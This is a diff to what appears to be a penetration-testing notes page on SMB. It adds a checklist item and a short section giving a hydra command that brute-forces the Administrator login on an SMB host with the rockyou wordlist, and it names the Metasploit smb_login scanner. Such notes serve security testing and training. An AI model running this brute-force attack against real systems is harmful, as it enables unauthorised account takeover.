@@ -32,6 +32,7 @@ SMB functions as a request-response or client-server protocol. The only time tha
 
 * [ ] Enumerate hosts, shares and your access to shares
 * [ ] Check for null sessions
+* [ ] Login Brute Force
 * [ ] Check for UNC path access in Windows
 * [ ] Try to mount and access files in shares
 * [ ] Check for CVEs
@@ -268,6 +269,13 @@ There are also some special default administrative shares which are used by syst
 • \ComputerName\ipc$ is used for inter-process communication. You cannot browse it via Windows Explorer
 
 ​​You can test volume shares and the admin$ share on your computer by entering the following on your Windows Explorer address bar
+
+## SMB Login Brute Force
+
+```
+hydra -l Administrator -P /usr/share/wordlists/rockyou.txt smb://172.16.2.11 -t 1 -vV -I
+use auxiliary/scanner/smb/smb_login
+```
 
 ## Symlink Directory Traversal
 
